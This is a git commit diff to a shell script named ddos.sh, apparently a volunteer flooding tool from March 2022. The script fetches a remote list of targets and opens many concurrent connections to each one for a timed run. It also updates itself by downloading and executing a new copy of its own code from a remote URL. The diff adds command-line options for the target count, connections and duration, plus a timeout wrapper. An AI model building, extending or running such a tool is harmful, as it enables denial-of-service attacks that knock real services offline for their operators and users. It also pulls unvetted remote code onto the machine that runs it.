90b2e63e6d4e93ac422379cd286a5d0ac88daf83
Ruski Korabl Idi Naxuy <ruskinaxuy@mm.st>
2022-03-06 10:48:23 +0200

    options and timeout

--- ddos.sh
+++ ddos.sh
@@ -4,9 +4,30 @@ set -e -o errexit #-x
 
 ### Config
 
-TIME=40m # time to work
+TIME=$(expr 40 '*' 60) # time to work
 CONNS=40 # connections per target
 TOTAL=40 # maximum number of targets
+
+usage() {
+    echo "Usage: $(basename "$0") [-n TOTAL] [-c CONNS] [-t SECONDS]
+
+where:
+  -h          show this help text
+  -n TOTAL    total number of targets (default: $TOTAL)
+  -c CONNS    number of connections per target (default: $CONNS)
+  -t SECONDS  seconds to run for (default: $TIME)
+"
+}
+
+while getopts "ht:c:n:" arg; do
+    case $arg in
+        t) TIME=${OPTARG};;
+        c) CONNS=${OPTARG};;
+        n) TOTAL=${OPTARG};;
+        *) usage; exit 0;;
+    esac
+done
+
 
 ### Global vars
 
@@ -36,13 +57,14 @@ fi
 
 ### Self-update
 
-if [ -z "$DISABLE_SELFUPDATE" ]; then
+if [ -z "$DISABLE_UPDATE" ]; then
     SELF_CURSUM=$(csum "$0")
     curl -sLo "$SELFUPDATE" "$SELF_URL"
     SELF_NEWSUM=$(csum "$SELFUPDATE")
     if [ "$SELF_CURSUM" != "$SELF_NEWSUM" ]; then
         echo "Updating to version $SELF_NEWSUM"
         mv "$SELFUPDATE" "$0"
+        chmod +x "$0"
         exec "$0" "$@"
         exit 0
     fi
@@ -81,14 +103,15 @@ fi
 
 ### Download targets
 
-TGT_OLDSUM=$(csum "$TGT_FILE")
-curl -sLo "$TGT_FILE" "$TGT_URL"
-TGT_NEWSUM=$(csum "$TGT_FILE")
+if [ -z "$DISABLE_UPDATE" ]; then
+    TGT_OLDSUM=$(csum "$TGT_FILE")
+    curl -sLo "$TGT_FILE" "$TGT_URL"
+    TGT_NEWSUM=$(csum "$TGT_FILE")
 
-if [ "$TGT_OLDSUM" != "$TGT_NEWSUM" ]; then
-    echo "Targets are updated to version $TGT_NEWSUM"
+    if [ "$TGT_OLDSUM" != "$TGT_NEWSUM" ]; then
+        echo "Targets are updated to version $TGT_NEWSUM"
+    fi
 fi
-
 
 ### Go
 
@@ -97,13 +120,21 @@ ACTUAL_TARGETS=$(cat "$TGT_FILE" \
                      | grep -v '^\s*$' \
                      | shuf -n "$TOTAL")
 
+TIMEOUT=$(expr "$TIME" + 2)
+
 (trap 'kill 0' SIGINT
 
  while read line; do
-     "$TOOL" -c "$CONNS" -d "$TIME" -l "$line" &
+     timeout "$TIMEOUT" "$TOOL" -c "$CONNS" -d "${TIME}s" "$line" &
  done <<EOF
     $ACTUAL_TARGETS
 EOF
 
  wait
+
+ # while true; do
+ #     jobs -p | xargs ps -p | tail -n+2 | awk '{print substr($0, index($0, $4))}'
+ #     test -z "$(jobs)" && exit 0
+ #     sleep 1
+ # done
 )
